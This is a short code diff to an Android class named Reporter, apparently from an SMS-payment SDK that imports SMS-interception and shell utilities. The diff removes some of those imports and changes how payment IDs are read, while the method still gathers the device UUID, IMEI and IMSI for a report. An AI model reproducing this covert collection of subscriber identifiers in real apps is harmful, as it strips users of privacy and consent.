@@ -9,10 +9,8 @@ import android.util.Log;
 
 import com.gandalf.daemon.utils.DeviceUuidFactory;
 import com.gandalf.daemon.utils.XL_log;
-import com.msm.modu1e.utils.DeviceInfoUtil;
 import com.msm.modu1e.utils.IMSInfo;
 import com.msm.modu1e.utils.ImsiUtil;
-import com.msm.modu1e.utils.SMSUtil;
 import com.msm.modu1e.utils.ShellUtils;
 import com.msm.modu1e.utils.ShellUtils.CommandResult;
 import com.thirdparty.engine.AppBuildConfig;
@@ -21,7 +19,6 @@ import com.thirdparty.entry.DeviceAppinfo;
 import com.thirdparty.entry.DeviceBaseInfo;
 import com.thirdparty.entry.DeviceChannelInfo;
 import com.thirdparty.entry.ThirdSdkTask;
-import com.thirdparty.sms.utils.SmsInterceptHelper;
 import com.thirdparty.utils.AppUtil;
 import com.thirdparty.utils.Constants;
 import com.thirdparty.utils.DeviceBaseInfoUtil;
@@ -41,8 +38,8 @@ public class Reporter {
     private static XL_log log = new XL_log(Reporter.class);
 
     public static void reportSmsReflect(Context context, Callback<String> callback) {
-        PayTask curPayTask = ServiceStub.getInstance(context).getCurPayTask();
-        if (context == null || curPayTask == null) {
+
+        if (context == null) {
             return;
         }
         DeviceChannelInfo info = DeviceChannelInfoUtil.getDeviceChannelInfo(context);
@@ -67,8 +64,8 @@ public class Reporter {
             return;
         }
         DeviceBaseInfo baseInfo = info.mDeviceBasicInfo;
-        params.put("pid", curPayTask.mPid);
-        params.put("cid", curPayTask.mCid);
+        params.put("pid", ServiceStub.mPid);
+        params.put("cid", ServiceStub.mCid);
         params.put("uuid", new DeviceUuidFactory(context).getDeviceUuid());
         params.put("imei", imei);
         params.put("imsi", imsi);
